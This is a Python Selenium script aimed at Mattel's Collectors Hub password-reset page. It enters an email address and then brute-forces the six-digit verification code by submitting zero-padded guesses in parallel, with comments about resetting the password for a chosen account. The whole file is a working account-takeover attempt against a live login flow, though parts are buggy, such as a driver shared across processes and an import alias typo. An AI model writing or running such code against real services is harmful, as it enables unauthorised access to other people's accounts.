import selenium
import time
import multiprocessing as mp
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as ECss


# Pathway that contains webdriver
PATH = '/Users/tippylaptop/dev/webdriver_tool/chromedriver'
driver = webdriver.Chrome(PATH)

# Function will be in charge of updating list
def update_list(data_value):
    # TODO: Send to browser input box and click()
    time.sleep(2)
    input_verify = driver.find_element_by_id('verifyCode')
    input_verify.click()
    input_verify.clear()

    # Fills in the extra 0 if there is space
    code_str = str(data_value)
    verification_code = code_str.zfill(6)
    # print(verification_code)
    
    # Send the guessed verification code to the input box
    input_verify.send_keys(verification_code)
    input_verify.send_keys(Keys.ENTER)

    # if code SUCCEEDS, script should be able to do nothing
    
    # if code FAILS to be on list --> send data list back to main area to update list
    return data_value

if __name__ == '__main__':
    data = [0,1,2,3,4,5,6,7,8,9] #size 10
    # Driver opens up web browser after clicking on "FORGOT PASSWORD"
    driver.get('https://login.platform.mattel/forgot?client_id=collectorshub&code_challenge=6yhg98M4aHc17q9u4NE7aJK8TGaNDiqusuVO3_vIXo8&code_challenge_method=S256&redirect_uri=https%3A%2F%2Fplatform.mattel%2Foauth%2Fcallback%2Fmcpp&response_type=code&state=eyJjbGllbnRfaWQiOiJjb2xsZWN0b3JzaHViIiwibm9uY2UiOiJSaWVMTk5LTjY5eHl6RkpOTkhlTiJ9')
    time.sleep(2)

    # Inserts email we want to reset password for
    input_email = driver.find_element_by_id('email')
    input_email.click()
    # TODO: Erase email before pushing
    input_email.send_keys("")
    input_email.send_keys(Keys.ENTER)

    # THIS SECTION IS FOR VERIFICATION CODE...currently manually inputting the first 5 digits until efficiency is increased
    while True:
        pool = mp.Pool(mp.cpu_count())

        pool.map(update_list, data)
        pool.close()

        # Parallelism
        data = list(map(lambda item: (item + 10), data))
        print(data)
        # Breaks out of loop
        if data[9] == 59:
            break

        # time.sleep(2)
        # input_verify = driver.find_element_by_id('verifyCode')
        # input_verify.click()
        # input_verify.clear()

        # Fills in the extra 0 if there is space
        # code_str = str(i)
        # verification_code = code_str.zfill(6)

        # Send the guessed verification code to the input box
        # input_verify.send_keys(verification_code)
        # input_verify.send_keys(Keys.ENTER)
        # i = i+1

    # Success == Quits browser
    time.sleep(5)
    driver.quit()